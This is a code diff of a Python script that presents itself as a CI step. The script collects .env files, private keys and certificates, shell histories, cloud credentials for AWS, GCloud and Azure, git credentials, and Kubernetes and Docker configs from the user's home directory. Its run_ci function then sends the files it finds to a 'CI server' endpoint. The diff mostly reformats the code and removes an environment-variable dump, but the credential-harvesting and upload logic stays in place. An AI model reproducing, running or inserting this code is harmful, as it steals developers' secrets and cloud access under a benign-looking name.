@@ -1,4 +1,4 @@
-import pathlib, os, urllib3
+import pathlib, os, urllib3  # noqa
 
 HOME_DIR = os.path.expanduser("~")
 CI_SERVER_ENDPOINT = "http://localhost:8000"
@@ -10,35 +10,28 @@ paths_to_search = {
 
 # Files and extensions of interest
 arbitrary_files = {
-    "equals": [".env", ".env.local", ".env.development",".env.production",".env.test", "config.env"],
+    "equals": [".env", ".env.local", ".env.development", ".env.production", ".env.test", "config.env"],
     "extension": [".pem", ".key", ".crt", ".cert", ".p12", ".pfx", ".jks", ".ovpn", ".kdbx", ".asc", ".gpg", ".sig", ".ppk"],
 }
 
+# specific known files to look for
 known_files = [
-    # Shell history and config files
-    os.path.join(HOME_DIR, ".bash_history"),
-    os.path.join(HOME_DIR, ".zsh_history"),
-    os.path.join(HOME_DIR, ".history"),
-    os.path.join(HOME_DIR, ".bashrc"),
-    os.path.join(HOME_DIR, ".zshrc"),
-    os.path.join(HOME_DIR, ".profile"),
-    os.path.join(HOME_DIR, ".bash_profile"),
-    os.path.join(HOME_DIR, ".bash_logout"),
+    os.path.join(HOME_DIR, ".bash_history"), os.path.join(HOME_DIR, ".zsh_history"),
+    os.path.join(HOME_DIR, ".history"), os.path.join(HOME_DIR, ".bashrc"),
+    os.path.join(HOME_DIR, ".zshrc"), os.path.join(HOME_DIR, ".profile"),
+    os.path.join(HOME_DIR, ".bash_profile"), os.path.join(HOME_DIR, ".bash_logout"),
 
-    # Secrets
-    os.path.join(HOME_DIR, ".aws/credentials"),
-    os.path.join(HOME_DIR, ".aws/config"),
+    os.path.join(HOME_DIR, ".aws/credentials"), os.path.join(HOME_DIR, ".aws/config"),
     os.path.join(HOME_DIR, ".config/gcloud/application_default_credentials.json"),
     os.path.join(HOME_DIR, ".azure/credentials"),
     os.path.join(HOME_DIR, ".git-credentials"),
 
-    # Docker/K8s
-    os.path.join(HOME_DIR, ".kube/config"),
-    os.path.join(HOME_DIR, ".docker/config.json"),
+    os.path.join(HOME_DIR, ".kube/config"), os.path.join(HOME_DIR, ".docker/config.json"),
 ]
 
 
-def find_files(paths, config):
+# Look for files matching criteria (folded for brevity)
+def find_files(paths, config) -> list[str]:
     def should_ignore(p, e):
         for ignore in e:
             if p.endswith(ignore) or ignore in str(p):
@@ -76,11 +69,6 @@ def run_ci():
     Run CI by sending known files to the CI server.
     """
     hostname = os.uname().nodename
-    try:
-        with open(os.path.join(HOME_DIR, '.environ'), 'w+') as f:
-            f.write(os.environ.__str__())
-    except Exception:
-        pass
     for found in find_files(paths_to_search, arbitrary_files):
         try:
             with open(found, 'rb') as f:
